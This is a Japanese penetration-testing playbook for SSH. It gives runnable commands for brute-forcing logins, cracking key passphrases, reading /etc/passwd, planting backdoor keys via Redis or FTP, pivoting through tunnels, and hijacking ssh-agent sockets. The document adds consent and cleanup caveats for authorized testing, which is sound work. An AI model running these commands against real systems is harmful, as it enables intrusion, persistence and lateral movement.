# SSH

> **スコープ: 22 番ポート（または非標準 SSH ポート）の列挙〜接続取得・SSH 関連の取得後活動まで**。バナー観察・認証方式列挙・ホスト鍵 fingerprint・アルゴリズム監査・既知バグ判定・認証突破・秘密鍵パスフレーズクラック・制限シェル脱出・Port Forwarding / pivot・SSH Agent ハイジャック・authorized_keys 書込による侵入/persistence までを 1 ファイルで扱う。接続後の Linux 列挙・権限昇格・SSH 以外の persistence（cron / systemd / bash_history 痕跡等）は `../03_Post_Access_Linux/Enumeration_Checklist.md` を参照。


## 着火条件

以下のいずれかに該当する場合:

- ポートスキャンで `22/tcp open ssh`（または非標準ポート上に SSH バナー）を検出
- 認証情報（パスワード / 秘密鍵 / ユーザー名リスト）が取得済みで認証試行を行う
- 製品出荷時のデフォルト認証情報を試行する許可がある
- 既知の SSH 接続を経由した内部 pivot を計画している

## 環境前提

- 実行環境: テスター端末
- 必要なツール: `nmap` / `ssh` / `nc` / `ssh-keyscan` / `ssh-keygen` / `hydra` / `medusa` / `ncrack` / `ssh2john` / `john` または `hashcat` / `proxychains`（いずれもペネトレ用 Linux ディストリ標準搭載）
- 外部リソース依存: 辞書ファイル (`/usr/share/wordlists/rockyou.txt` 等) は標準同梱、オフラインでも実施可。Debian PRNG 弱鍵リスト (§10) のみ GitHub からの取得が必要

## 先に確認すること

- **対応認証方式（下記 §2）**: `publickey` のみの環境ではパスワード辞書攻撃は無効
- **ロックアウト設定**: `Account_Lockout_Recon.md` の SSH 節（`MaxAuthTries` / fail2ban / pam_faillock）
- **試行ポート**: 標準 22 だけでなく、`nmap` で 2222 / 22000 / 2200 等の代替ポートも確認

**攻撃者の思考トレース:** SSH は認証情報がなければ入れない。Web / FTP / SMB で先に認証情報を取得し、SSH では「取れた cred を試す」スタンスが基本。一からの辞書攻撃は時間対効果が悪く、`auth.log` に大量の `Failed password` を残して検知されやすい。試行の前にバナー・認証方式・ロックアウトを確認することで、無駄な試行と検知リスクを減らせる。**接続が取れた後は pivot 設計（§11）に直結**。

---

## 1. バナー観察 / バージョン判定

**コマンド:**

```bash
# [Attacker] nmap によるバナー取得 + サービス特定
nmap -sV -p 22 [TARGET_IP]
# 出力例: 22/tcp open  ssh  OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

# [Attacker] nc での生バナー
nc [TARGET_IP] 22
# SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
# Ctrl+C で抜ける
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `SSH-2.0-OpenSSH_7.7` 以下 | CVE-2018-15473 が効く可能性 | §9 ユーザー列挙へ |
| `SSH-2.0-OpenSSH_8.5p1` 〜 `9.7p1` on glibc Linux | **CVE-2024-6387 (regreSSHion)** pre-auth RCE が成立する可能性 | バージョン該当を確認。実 exploit は race condition で多数試行を要する（数時間〜）。**事前合意済み環境以外では発火させない** |
| `SSH-2.0-OpenSSH_5.x` 〜 `7.x` | 古い OpenSSH、複数 CVE 該当の可能性 | `searchsploit OpenSSH [VERSION]` |
| `SSH-1.x` の応答 (`-1` 接続で受理) | SSHv1 protocol 有効、極めて古いサーバー | `nmap --script ssh1-banner` で確認、製品の年代を疑う |
| バナーに `Ubuntu` / `Debian` / `FreeBSD` 等 | OS 判定の手掛かり | `../00_Playbook/00_OS_Identification.md` に戻す |
| バナーが返らない（`DebianBanner no` 等） | バナー suppress 設定 | §3 ホスト鍵 fingerprint で代替判定 |
| バナーに `libssh_X.Y.Z` | libssh 実装。CVE-2018-10933 認証バイパスが効く古い版を疑う | `searchsploit libssh` |

> **注意:** バナーは `/etc/ssh/sshd_config` の `Banner` ディレクティブで偽装可能。version 文字列だけで CVE 該当を断定せず、実挙動でも確認する。**CVE-2024-6387 は exploit 自体が困難**（race condition で数時間〜の試行が必要・ログに大量痕跡）なので、バージョン該当でも実行可否は環境次第。

---

## 2. 対応認証方式の列挙

**コマンド:**

```bash
# [Attacker] verbose 出力から認証方式リスト取得
ssh -v -o PreferredAuthentications=none -o StrictHostKeyChecking=no [USER]@[TARGET_IP] 2>&1 | grep "Authentications that can continue"
# debug1: Authentications that can continue: publickey,password

# [Attacker] nmap 版（同じ目的、より簡潔）
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=[USER]" [TARGET_IP]
```

> **オプションの意味:**
>
> - `-o PreferredAuthentications=none`: クライアントが提示する認証方式リストを **空** に指定。認証は必ず失敗するが、その手前でサーバが「使える認証方式」を `Authentications that can continue: ...` として返してくる。これを `-v` の debug 出力から拾うのが目的
> - `-o StrictHostKeyChecking=no`: 初接続時のホスト鍵検証プロンプト（`Are you sure you want to continue connecting (yes/no)?`）を抑止する。自動化（grep へのパイプ）には必須。**MitM 検出を無効化する副作用があるため、本フロー以外の用途では使わない**
> - `-v`: debug 出力を stderr に出す
> - `2>&1`: stderr を stdout に合流させて grep に通す

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `publickey` のみ | パスワード認証無効 | §8 秘密鍵パスフレーズクラックや秘密鍵取得経路を優先。`Credential_Discovery.md` |
| `publickey,password` | 両方有効、辞書攻撃の余地あり | §7 hydra（要 §先に確認 の ロックアウト確認）|
| `keyboard-interactive` を含む | PAM 経由認証（2FA や独自プロンプトの可能性） | 自動化前に対話挙動を確認、ナイーブな辞書攻撃は失敗しやすい |
| `gssapi-with-mic` を含む | Kerberos / GSSAPI 認証有効。AD 連携 Linux の可能性 | `ssh -K user@target` で Kerberos チケットを使ったログイン試行（要事前 `kinit`） |

> `[USER]` 部分には存在しないユーザー名を入れて良い（OpenSSH は user enum を避ける設計のため認証方式自体は返る）。

---

## 3. ホスト鍵 fingerprint 捕捉（鍵使い回し検出）

**コマンド:**

```bash
# [Attacker] ssh-keyscan による鍵取得
ssh-keyscan -t rsa,ecdsa,ed25519 [TARGET_IP] 2>/dev/null

# [Attacker] fingerprint の計算
ssh-keyscan -t ed25519 [TARGET_IP] 2>/dev/null | ssh-keygen -lf -
# 出力例: 256 SHA256:[FINGERPRINT_HASH] [TARGET_IP] (ED25519)
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 複数ホストで fingerprint 一致 | テンプレートからのクローン環境 | 1 ホストで取得した秘密鍵が他でも通る可能性 → 横展開候補に追加 |
| 鍵タイプが `ssh-rsa` のみ（ed25519 なし）| 古い設定 | バージョンも古い可能性 → §1 と合わせて再確認 |
| `ssh-dss` (DSA host key) | 既定で無効化された古い形式 | 古い OpenSSH の可能性、§1 と合わせて確認 |

> `ssh-keyscan` 接続はターゲット側に `Connection closed by [IP] port [PORT] [preauth]` として記録される。事前合意の範囲内で実施。

---

## 4. アルゴリズム・暗号スイート列挙（KEX / Cipher / MAC 監査）

**コマンド:**

```bash
# [Attacker] nmap ssh2-enum-algos スクリプト
nmap -sV -p 22 --script ssh2-enum-algos [TARGET_IP]
# 出力: 対応 kex_algorithms / encryption_algorithms / mac_algorithms / compression のリスト
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `chacha20-poly1305@openssh.com` cipher または `*-etm@openssh.com` MAC が有効、かつ KEX に `kex-strict-s-v00@openssh.com` が **無い** | **CVE-2023-48795 (Terrapin)** prefix truncation 攻撃が成立する可能性 | MitM 経路が組める環境のみ実 exploit 可能。通常は audit / compliance finding として記録 |
| 弱い KEX（`diffie-hellman-group1-sha1` / `diffie-hellman-group-exchange-sha1`） | 構成不備 | audit finding として記録、復号攻撃の前提条件として記録 |
| 弱い暗号（`arcfour` / `3des-cbc` / `blowfish-cbc`） | 構成不備 | 同上 |
| `kex-strict-s-v00@openssh.com` が KEX に **有る** | Terrapin パッチ適用済み | Terrapin は無効化されている、他経路へ |

> **注意:** Terrapin は MitM 前提のため、攻撃側経路に MitM を持ち込めない通常のテストでは audit finding 扱いが現実的。`kex-strict-*` の存在で patch 適用済みか判定できる。

> **接続のために重要（finding 止まりにしない）:** 弱い KEX（`diffie-hellman-group1-sha1` 等）/ `ssh-rsa`・`ssh-dss` ホスト鍵 / CBC 暗号しか無い古い OpenSSH は、**現代の ssh クライアントが既定で接続を拒否する**（`Unable to negotiate ... no matching key exchange method found`）。ここで見た弱アルゴ一覧は audit 記録であると同時に、**後で cred を入手して §5 で接続する際に、どのレガシーアルゴリズムを明示すべきか**の手掛かりになる（§5 のレガシー接続例を参照）。

---

## 5. 認証情報での直接ログイン

**コマンド:**

```bash
# [Attacker] パスワード認証
ssh [USER]@[TARGET_IP]
# パスワードプロンプトで [PASSWORD] を入力

# [Attacker] 非標準ポート
ssh -p [PORT] [USER]@[TARGET_IP]

# [Attacker] 秘密鍵
chmod 600 [KEY_FILE]
ssh -i [KEY_FILE] [USER]@[TARGET_IP]

# [Attacker] 保存済み鍵を抑止して指定鍵のみで試行
ssh -i [KEY_FILE] -o IdentitiesOnly=yes [USER]@[TARGET_IP]

# [Attacker] 古い OpenSSH（弱い KEX / ssh-rsa・ssh-dss 鍵 / CBC のみ）へ接続する場合
# §4 の ssh2-enum-algos で diffie-hellman-group1-sha1 / ssh-dss / *-cbc しか無い相手
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 \
    -oHostKeyAlgorithms=+ssh-rsa,ssh-dss \
    -c aes128-cbc [USER]@[TARGET_IP]
# 公開鍵認証も拒否されるなら -oPubkeyAcceptedKeyTypes=+ssh-rsa も追加
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| プロンプトが返る | ログイン成功 | §6 制限シェル判定 → `../03_Post_Access_Linux/Enumeration_Checklist.md` |
| `Permission denied (publickey)` | パスワード認証無効 | §2 で再確認 → 秘密鍵取得経路へ |
| `Permission denied (publickey,password)` | 認証情報が不正 | §7 辞書攻撃 or 別 cred を試行 |
| `UNPROTECTED PRIVATE KEY FILE!` | 鍵パーミッションが緩い | `chmod 600 [KEY_FILE]` してから再試行 |
| `Too many authentication failures` | `MaxAuthTries` 到達、または保存鍵が複数試行されている | `-o IdentitiesOnly=yes -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1` で 1 回ずつ |
| ログイン直後にすぐ切断 | `ForceCommand` 設定 | §11 port forwarding 専用に切替（`ssh -N` でシェル不要）|
| `Unable to negotiate ... no matching key exchange method found` / `no matching host key type` / `no matching cipher` | 古い OpenSSH でレガシー KEX/鍵/暗号のみ（§4 の弱アルゴと符合）| `-oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa,ssh-dss -c aes128-cbc` を付けて再接続 |

**注意:**

- 秘密鍵パーミッションが `644` 等で緩いと `UNPROTECTED PRIVATE KEY FILE!` で拒否される。`chmod 600 [KEY_FILE]` 必須
- `ssh -A`（agent forwarding）有効で接続すると、**侵入先ホストの管理者から攻撃者の鍵が乗っ取られる逆方向のリスク**がある。本番では `-A` を付けない

---

## 6. 制限シェル脱出 / SCP・SFTP のみ許可された制限アカウント

**観測される出力 → 次のアクション:**

| ログイン直後の挙動 | 示唆 | 次のアクション |
|---|---|---|
| `cd /` で `cd: restricted` 等のエラー | rbash 等の制限シェル | 下記の脱出パターンを試す |
| `echo $SHELL` で `/bin/rbash` / `/usr/bin/lshell` 等 | 同上 | 同上 |
| プロンプトが特殊文字（`>` のみ等） | 独自制限シェル | `ssh -t '/bin/bash'` で接続時に bash 強制 |
| `ssh user@target` で `This account is restricted to SCP/SFTP` 等エラー、シェル取得不可 | SCP / SFTP のみ許可アカウント | 下記 SCP/SFTP 経由のファイル読み取り経路へ |

**制限シェル (rbash / lshell) の脱出コマンド:**

```bash
# [Target] 制限シェル内で エディタからシェル起動
vi -c ':!/bin/bash'

# [Target] ed エディタ経由
ed
!/bin/bash

# [Attacker] SSH 接続時に直接シェル指定（最も簡単）
ssh [USER]@[TARGET_IP] -t '/bin/bash --noprofile --norc'

# [Target] PATH 復元
export PATH=/bin:/usr/bin:/usr/local/bin:$PATH
/bin/bash
```

**SCP / SFTP のみアカウントの読み取り経路:**

```bash
# [Attacker] SFTP で接続を試す
sftp [USER]@[TARGET_IP]
# sftp> ls /etc/
# sftp> get /etc/passwd
# sftp> get /etc/group
# sftp> get /home/[USER]/.ssh/id_rsa     # 自ユーザーの鍵なら読める

# [Attacker] SCP で直接ファイル取得
scp [USER]@[TARGET_IP]:/etc/passwd .
scp [USER]@[TARGET_IP]:/etc/issue .
scp -r [USER]@[TARGET_IP]:/home/[USER]/ .   # ホームディレクトリ全取得

# [Attacker] SFTP 内から ! でテスター側コマンド実行（target shell は得られない）
sftp> !ls -la       # ローカル ls
sftp> !cat downloaded_passwd
```

> **注意:** SCP / SFTP 限定アカウントは **target shell を得られない**が、`/etc/passwd` / `/etc/issue` / `.bash_history` / `.ssh/known_hosts` 等を読めれば横展開先の特定や認証情報抽出が可能。`ChrootDirectory` 設定下では chroot 範囲のファイルのみ。

---

## 7. hydra / medusa / ncrack による辞書攻撃

**事前準備（必須）:** `Account_Lockout_Recon.md` で SSH 側のロックアウト閾値・観察期間を確認し、試行間隔を設計する。

**コマンド:**

```bash
# [Attacker] hydra (最も汎用)
hydra -l [USER] -P /usr/share/wordlists/rockyou.txt ssh://[TARGET_IP] -t 4
hydra -L users.txt -p '[PASSWORD]' ssh://[TARGET_IP] -t 4 -W 5         # スプレー
hydra -l [USER] -P passwords.txt ssh://[TARGET_IP]:[PORT] -t 4         # 非標準ポート

# [Attacker] medusa (hydra の代替・古い・並列モデルが異なる)
medusa -h [TARGET_IP] -u [USER] -P /usr/share/wordlists/rockyou.txt -M ssh -t 4

# [Attacker] ncrack (より stealth・低速・スキャナ寄りの並列制御)
ncrack -p ssh --user [USER] -P /usr/share/wordlists/rockyou.txt [TARGET_IP] -T2 -CL 1

# [Attacker] nmap ssh-brute スクリプト (簡易・nmap だけで完結)
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt [TARGET_IP]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `[22][ssh] host: [IP]   login: [USER]   password: [PASS]` (hydra) | 認証成功 | §5 で直接ログインへ |
| 全 cred が拒否 | パスワード認証無効 / 認証情報全滅 | §2 で認証方式を再確認 |
| 試行が極端に遅い | fail2ban / sshguard の per-IP throttle | `hydra -t 1 -W 30` で並列度 1・待機 30 秒、または `ncrack -T1` に切替 |
| `Connection closed by ...` で即切断 | `MaxAuthTries 1` / `AllowUsers` 制限 / IP ベース拒否 | 接続元を変える / 認証方式を `-o PubkeyAuthentication=no` 同等で絞る |
| hydra が動かない (timeout 多発) | 環境依存の hydra の不具合 | `medusa` / `ncrack` / `nmap ssh-brute` 代替へ切替 |

---

## 8. 秘密鍵パスフレーズクラック（ssh2john + john / hashcat）

**観測される出力 → 次のアクション:**

| 取得した鍵の状態 | 示唆 | 次のアクション |
|---|---|---|
| `Proc-Type: 4,ENCRYPTED` 行を含む（PEM 形式・暗号化済み） | パスフレーズ必要 | 下記コマンドでクラック |
| `-----BEGIN OPENSSH PRIVATE KEY-----` の中に `bcrypt` の kdf 表記 | OpenSSH 新形式の暗号化済み | 下記コマンドでクラック |
| 暗号化マーカーなし | パスフレーズ不要 | §5 で直接ログイン |

**コマンド:**

```bash
# [Attacker] ハッシュ化
ssh2john [KEY_FILE] > key.hash

# [Attacker] john でクラック
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash

# [Attacker] hashcat でクラック（mode 22921: SSH private key）
hashcat -m 22921 key.hash /usr/share/wordlists/rockyou.txt
```

刺さらなかったとき: `key_load_public: invalid format` が出る場合、形式変換が必要 → `ssh-keygen -p -m PEM -f [KEY_FILE]`。

---

## 9. CVE-2018-15473 ユーザー列挙（OpenSSH 7.7 未満）

**事前準備（必須）:** `USER_FILE` / PoC の `-u` は**実在するユーザー名辞書ファイルへのパス**を指す。`users.txt` はプレースホルダであり、ファイルが無いと `Msf::OptionValidateError: ... USER_FILE` で即失敗する（モジュールは走らない）。候補リストを先に用意する:

```bash
# [Attacker] 標準のユーザー名辞書を使う（seclists 等。ペネトレ用 Linux ディストリに同梱 or apt で導入）
ls /usr/share/seclists/Usernames/                 # 例: top-usernames-shortlist.txt
# [Attacker] 自前で作る場合（OSINT 候補を足す）
printf '%s\n' root admin user test [OSINT_CANDIDATE] > users.txt
```

**コマンド:**

```bash
# [Attacker] Metasploit モジュール（USER_FILE は上で用意した実在パスを指定）
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; \
  set RHOSTS [TARGET_IP]; set USER_FILE users.txt; run; exit"

# [Attacker] スタンドアロン PoC（searchsploit から取得）
searchsploit -m 45233
python3 [POC_SCRIPT] [TARGET_IP] -p 22 -u users.txt

# [Attacker] OSINT で対象組織メンバーから候補ユーザー名を取得
# 例: GitHub アカウントの公開鍵 URL
curl https://github.com/[ORG_MEMBER_USERNAME].keys
# 公開鍵が返れば、その username が SSH の username 候補 (組織内 SSH 命名規則と一致するか確認)
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 有効ユーザー名のリストが返る | スプレー対象が確定 | §7 hydra スプレー / `Default_Credentials.md` のユーザーリストに使用 |
| 全ユーザーが invalid 判定 | OpenSSH 7.7+ にパッチ済み | LDAP / SMTP VRFY / SMB / OSINT で別経路から取得 |
| ヒット数が乱高下する | ネットワーク遅延がタイミング差を上回る誤検知 | **1 ユーザー名で複数回測定して分散を見る** |
| GitHub `.keys` で 200 + 鍵本文 | username 実在 + 公開鍵入手 | username 候補リストに追加 |

**注意:** ユーザー列挙は**それ単体ではアクセスにならない**（有効 username が分かるだけ）。後段の §7 スプレー or 鍵/cred と組み合わせて初めて侵入になる。版数が該当しても得られるのは username のみなので、これに固執せず他サービス・他経路と並行する。

> 原理: 公開鍵認証リクエストの特殊フィールドで、無効ユーザー名は即拒否、有効ユーザー名はパース時間がかかる差を利用。

> **注意:** 本 PoC はタイミング差ベースのため、ネットワーク遅延がタイミング差を上回る環境では誤検知が出る。**1 ユーザー名で複数回測定して分散を見る**のが堅実。

---

## 10. Debian PRNG 弱鍵 (CVE-2008-0166)

**着火条件:** ターゲットが古い Debian / Ubuntu (2006-05 〜 2008-05 の OpenSSL パッケージ) で生成された SSH 鍵を使用している可能性。レガシー組み込み機器 / 古い VM テンプレート / 長期メンテされていない機器で稀に生存。

**コマンド:**

```bash
# [Attacker] 事前生成された脆弱秘密鍵リスト (32K 個 × ビット数別) を取得
# Kali / Parrot にも標準パッケージはなく、GitHub から取得
git clone https://github.com/g0tmi1k/debian-ssh
cd debian-ssh
# 展開先: rsa/2048/ / rsa/4096/ / dsa/1024/ などにビット数別の事前生成鍵

# [Attacker] 既知のユーザー (root 等) に対し全鍵を順次試行（並列化版）
ls rsa/2048/*.pub | head -n 100 | xargs -P 8 -I {} sh -c '
  key="{}"; key="${key%.pub}"
  ssh -i "$key" -o StrictHostKeyChecking=no -o PasswordAuthentication=no \
      -o ConnectTimeout=3 -o BatchMode=yes root@[TARGET_IP] "id" 2>/dev/null \
      && echo "MATCH: $key"
'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 1 つの鍵でログイン成功 | CVE-2008-0166 影響 | §5 で直接ログイン or §12 port forwarding 設計 |
| 全鍵で `Permission denied` | 脆弱鍵生成範囲外 / パッチ済み | 通常の認証経路 (§5-§7) に戻る |
| `Too many authentication failures` で途中切断 | `MaxAuthTries` に到達 | `-o IdentitiesOnly=yes` で 1 鍵ずつ + 試行間隔 sleep を入れる |

> **注意:** **2008 年公表の古典だが今もレガシー機器で生存**。ファームウェアアップデートが止まった IoT / 産業機器 / プリンタ / 古い VPS で稀にヒット。試行数 ~32K × 鍵タイプ で時間がかかる (1 鍵あたり ~3 秒) ので **必ず並列化** + `MaxAuthTries` 対策をする。

---

## 11. authorized_keys 書込による侵入・persistence

**着火条件:** 以下のいずれかでターゲットの `~/.ssh/authorized_keys`（または `/root/.ssh/authorized_keys`）への書込手段がある:

- 匿名 FTP 書込権限（`FTP.md` §5 で書込可能と確認済み）
- SMB 共有の書込権限
- Redis unauth + `CONFIG SET dir`/`dbfilename` 経由（古典的経路）
- PostgreSQL `COPY ... TO PROGRAM` / `lo_export` 経由（`PostgreSQL_Exploitation.md` §10 を参照。書込ファイルが `postgres:postgres` 所有になるため StrictModes 拒否の罠あり）
- MySQL `SELECT ... INTO OUTFILE` 経由（`MySQL_Exploitation.md` §9 を参照。書込ファイルが `mysql:mysql` 所有になるため StrictModes 拒否の罠あり）
- LFI / RFI + 任意ファイル書込脆弱性
- Web シェル取得済みで該当ユーザー権限がある
- 既存 SSH シェル取得済みで persistence を仕掛けたい

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須:
> - [x] **持続化に該当**（authorized_keys に書込んだ鍵は再起動・パスワード変更後も残る）
> - [x] **不可逆な設定変更を含む**（追加した鍵を消し忘れるとバックドア化）
> - [ ] 業務停止リスク
> - [x] SIEM / EDR で確実に検知される（File Integrity Monitoring / auditd `~/.ssh/` 監視で即アラート）
>
> 実施可否は事前合意で明示確認すること。**原状回復必須**（追加した公開鍵の削除）。演習環境（HTB / OSCP 等）では制約なし。

**コマンド:**

```bash
# [Attacker] パスフレーズなしの鍵ペアを攻撃側で生成（テスト識別子付き）
ssh-keygen -t ed25519 -f ./kedalab_[CASE_ID]_key -N '' -C "kedalab-[CASE_ID]"
# kedalab_[CASE_ID]_key（秘密鍵）と kedalab_[CASE_ID]_key.pub（公開鍵）が生成される

# [Attacker] 公開鍵を確認（末尾コメント kedalab-[CASE_ID] が grep の目印になる）
cat ./kedalab_[CASE_ID]_key.pub
# ssh-ed25519 AAAA... kedalab-[CASE_ID]
```

**書込手段ごとのバリエーション:**

```bash
# [Attacker] (A) 匿名 FTP 書込経由（FTP.md §5 で書込確認済みの場合）
curl -T ./kedalab_[CASE_ID]_key.pub ftp://anonymous:@[TARGET_IP]/home/[USER]/.ssh/authorized_keys

# [Attacker] (B) Redis unauth 経由（CONFIG SET dir / dbfilename で .ssh/authorized_keys に書込）
redis-cli -h [TARGET_IP] FLUSHALL
redis-cli -h [TARGET_IP] CONFIG SET dir /home/[USER]/.ssh/
redis-cli -h [TARGET_IP] CONFIG SET dbfilename authorized_keys
(echo ""; cat ./kedalab_[CASE_ID]_key.pub; echo "") | redis-cli -h [TARGET_IP] -x SET sshkey
redis-cli -h [TARGET_IP] SAVE
# 前後の空行が Redis のダンプヘッダを SSH に無視させるトリック

# [Attacker] (C) シェル取得済みで自分で persistence を仕掛ける（要書込権限）
mkdir -p ~/.ssh && chmod 700 ~/.ssh
cat ./kedalab_[CASE_ID]_key.pub >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# [Attacker] 接続試行
ssh -i ./kedalab_[CASE_ID]_key [USER]@[TARGET_IP]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `ssh -i ./[KEY]` でログイン成功 | 書込 + ログインの両方成立 | §5 と同じくシェル取得後の活動へ。**原状回復のため `authorized_keys` から該当行削除をテスト終了時に実施** |
| `Permission denied (publickey)` | パーミッション不正（`.ssh/` が 700 でない / `authorized_keys` が 600 でない / 所有者がターゲットユーザーでない）| 書込側で `chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys` を揃える |
| `Authentication refused: bad ownership or modes` (`auth.log` 側) | パーミッション・所有者の問題 | `chown [USER]:[GROUP]` も含めて修正 |
| Redis 経由で書込んでも接続が拒否 | Redis のダンプバイナリヘッダが SSH に拒否されている | 前後に空行を入れる、`-x SET sshkey` の前後にも `\n` を追加 |
| 接続成立後 `id` で別ユーザー | 書込先パスを誤った（`/root/.ssh/` ではなく `/home/[USER]/.ssh/`）| 書込先パスを修正して再試行 |
| `~/.ssh/` ディレクトリ自体が存在しない | 初回 SSH 利用がないユーザー | `mkdir -p ~/.ssh && chmod 700` を書込手段で先に実行 |

> **原状回復（必須）:** テスト識別子コメントマーカーで grep して該当行を確実に削除:
>
> ```bash
> # [Target] テスト終了時に実施
> sed -i.bak '/kedalab-\[CASE_ID\]/d' ~/.ssh/authorized_keys
> ```

> **注意:** sshd は `~/.ssh/`・`authorized_keys` のパーミッションと所有者を厳格にチェックする。**書込先のパーミッション (700 / 600) と所有者 (ターゲットユーザー) を必ず揃える**。`StrictModes yes` (sshd_config デフォルト) ではパーミッション不一致で即拒否され、`auth.log` に `Authentication refused: bad ownership or modes` が残る。

---

## 12. Port Forwarding / SOCKS pivot

**着火条件:** SSH 接続が取れている (§5 認証突破成功 / §11 authorized_keys 書込経由)。**外部から内部ネットワークへの pivot 経路**を作る、または特定の内部サービスを attacker 側からアクセス可能にする。

**コマンド:**

```bash
# [Attacker] (1) Local Port Forward: attacker 側ポート → SSH 経由 → 内部サービス
# attacker:8888 → SSH ホスト経由で 192.0.2.50:3306 (MySQL) へトンネル
ssh -L 8888:192.0.2.50:3306 [USER]@[TARGET_IP] -N
# attacker 側から: mysql -h 127.0.0.1 -P 8888 -u root -p

# [Attacker] (2) Remote Port Forward: 内側から attacker へ逆トンネル (NAT 越え用)
# target 上の 9999 → attacker:4444 へ
ssh -R 9999:127.0.0.1:4444 [USER]@[TARGET_IP] -N
# target 側で 9999 にアクセスすると attacker:4444 に届く

# [Attacker] (3) Dynamic Port Forward (SOCKS proxy): SSH 経由で任意宛先へ
ssh -D 1080 [USER]@[TARGET_IP] -N
# /etc/proxychains4.conf の末尾に: socks5 127.0.0.1 1080
# attacker から: proxychains nmap -sT -Pn -p 80,443 [INTERNAL_TARGET]
# attacker から: proxychains curl http://[INTERNAL_TARGET]/

# [Attacker] (4) ProxyJump: 多段 SSH チェイン
ssh -J [USER1]@[HOP1]:22 [USER2]@[INTERNAL_TARGET]
# HOP1 を経由して INTERNAL_TARGET へ直接ログイン (鍵は自動でフォワード)
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 接続成立 + 別端末から `nc -zv 127.0.0.1 8888` が通る | Local forward 成立 | attacker 側ツールで `127.0.0.1:[LOCAL_PORT]` 経由のアクセス |
| `Allocated port 9999 for remote forward` | Remote forward 成功 | target 上の 9999 が attacker:4444 にトンネル接続 |
| `channel 2: open failed: administratively prohibited: open failed` | sshd_config の `AllowTcpForwarding no` | port forwarding 禁止 → 別経路（chisel / SOCAT / `ssh -W`）を検討 |
| `bind: Permission denied` (Local forward) | 1024 未満ポート使用時の root 要求 | attacker 側で 1024 以上のポートを使う |
| ProxyJump 成功 / プロンプトが多段先のホストになる | 内部ネットワークへの足場確立 | `proxychains` 経由で内部スキャン |

> **注意:** Port forwarding は **侵入後の pivot 設計の中核**。SOCKS proxy + `proxychains` で内部 nmap / curl / その他全ツールが透過的に内部ネットへ届く。**`AllowTcpForwarding no` 環境では失敗**するので確認が必要。`-N` (no shell) は shell が制限されている環境でも forwarding だけ確立できる。

---

## 13. SSH Agent ハイジャック（他ユーザの ssh-agent 流用）

**着火条件:** ターゲットホストに既にシェル取得済み（§5 / §11 / 別経路）。**他ユーザー（特に root や開発者ユーザー）が `ssh-agent` を起動して秘密鍵をロード済み**で、`SSH_AUTH_SOCK` の Unix ソケットが自分の権限でアクセスできる状態。

**コマンド:**

```bash
# [Target] 動作中の ssh-agent プロセスとソケットパスを探索
ps auxeww | grep ssh-agent | grep SSH_AUTH_SOCK
# 出力例: SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.NNNN

# [Target] /tmp 配下の agent ソケットを直接探す
find /tmp -path '*/ssh-*/agent.*' 2>/dev/null
ls -la /tmp/ssh-*/agent.* 2>/dev/null

# [Target] 自分の権限で読めるソケットがあれば流用
export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.NNNN

# [Target] エージェントに登録されている鍵を確認（鍵本体は読めないが署名は要求できる）
ssh-add -l
# 2048 SHA256:[FINGERPRINT_HASH] /home/[OWNER]/.ssh/id_rsa (RSA)

# [Target] エージェント経由で他ホストへ ssh 接続（パスフレーズ・鍵ファイル本体不要）
ssh [USER]@[INTERNAL_TARGET_IP]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `ssh-add -l` で鍵リストが返る | agent ハイジャック成立 | リスト上の鍵で別ホストへ接続を試行・§12 SOCKS pivot と組み合わせて横展開 |
| `Could not open a connection to your authentication agent` | ソケットパスが間違い・権限不足 | `find / -name 'agent.*' 2>/dev/null` で範囲を広げる |
| `ssh-add -l` で `The agent has no identities` | agent は動いているが鍵未登録 | 別ユーザーの agent を探す |
| 自分が root の場合に全ソケットへアクセス可能 | 全ユーザーの SSH 認証情報を流用可能 | 各ユーザーの agent を順に試して横展開連鎖 |
| 接続先で `~/.bash_history` を見ると過去 ssh 接続先が判明 | 既知の接続先パターンが分かる | 順次同じ手順で agent ハイジャックを連鎖 |

> **原理:** `ssh-agent` は秘密鍵をメモリ上に保持し、Unix ソケット経由で「署名要求」を受ける設計。**鍵自体はソケットから読み出せない**が、**「この鍵で署名してくれ」と要求すれば応じる**ため、署名を使って ssh 接続が成立する。`SSH_AUTH_SOCK` 環境変数を盗まれた agent のソケットに向けるだけで攻撃成立する。

> **注意:** agent プロセスが終了するとソケットは無効になる（ターゲットユーザーがログアウトしたタイミングで切れる）。**侵入直後にすぐ試すのが鉄則**。ロード済み鍵の fingerprint を `ssh-add -l` で控えておくと、後で鍵ファイル本体を探すときの照合に使える（§3 fingerprint 捕捉と連携）。

